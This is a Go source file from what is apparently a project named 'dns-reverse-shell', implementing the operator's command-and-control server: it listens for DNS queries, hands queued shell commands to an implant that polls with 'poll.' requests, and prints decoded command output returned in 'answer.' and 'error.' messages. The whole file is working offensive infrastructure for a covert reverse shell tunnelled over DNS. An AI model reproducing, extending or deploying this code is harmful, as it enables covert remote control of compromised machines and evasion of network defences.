package protocol

import (
	"dns-reverse-shell/main/encoder"
	"fmt"
	"github.com/golang-collections/collections/queue"
	"github.com/miekg/dns"
)

type dnsHandler struct {
	server *DNSServer
}

func newDnsHandler(s *DNSServer) *dnsHandler {
	return &dnsHandler{server: s}
}

type DNSServer struct {
	port            string
	encoder         encoder.StringEncoder
	handler         *dnsHandler
	messageSplitter MessageSplitter
	queue           *queue.Queue
	callbackChan    chan bool
}

func NewDnsServer(port string, encoder encoder.StringEncoder, callbackChan chan bool) *DNSServer {
	d := &DNSServer{port: port, encoder: encoder, messageSplitter: NewSimpleMessageSplitter(), queue: queue.New(), callbackChan: callbackChan}
	d.handler = newDnsHandler(d)
	return d
}

func (s DNSServer) Serve() {
	server := s.createServer()
	fmt.Println("Starting Listener on port '" + s.port + "'")
	err := server.ListenAndServe()
	if err != nil {
		fmt.Printf("Failed to start server: %s\n", err.Error())
	}
}

func (s DNSServer) QueueCommand(command string) {
	s.queue.Enqueue(command)
}

func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
	msg := h.server.createAnswerMessage(r)
	for _, question := range r.Question {
		var command = h.server.switchCommand(question.Name, r)
		msg.Extra = h.server.buildAnswer(command)
	}
	h.server.writeMessage(w, msg)
}

func (s DNSServer) createServer() *dns.Server {
	return &dns.Server{
		Addr:      ":" + s.port,
		Net:       "tcp",
		Handler:   s.handler,
		ReusePort: true,
	}
}

func (s DNSServer) createAnswerMessage(r *dns.Msg) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true
	return msg
}

func (s DNSServer) switchCommand(receivedQuestion string, r *dns.Msg) string {
	var command = "idle"
	switch receivedQuestion {
	case "poll.":
		command = s.handlePolling()
	case "error.", "answer.":
		command = s.handleCallback(r)
	default:
		command = "idle"
	}
	return command
}

func (s DNSServer) handlePolling() string {
	if s.queue.Len() != 0 {
		return s.queue.Dequeue().(string)
	}
	return "idle"
}

func (s DNSServer) handleCallback(r *dns.Msg) string {
	collect := s.messageSplitter.Collect(r.Extra)
	fmt.Println(s.encoder.Decode(collect))
	s.callbackChan <- false
	return "ok"
}

func (s DNSServer) buildAnswer(command string) []dns.RR {
	encoded := s.encoder.Encode(command)
	return s.messageSplitter.Split(encoded)
}

func (s DNSServer) writeMessage(w dns.ResponseWriter, msg *dns.Msg) {
	err := w.WriteMsg(msg)
	if err != nil {
		fmt.Println(err)
		return
	}
}
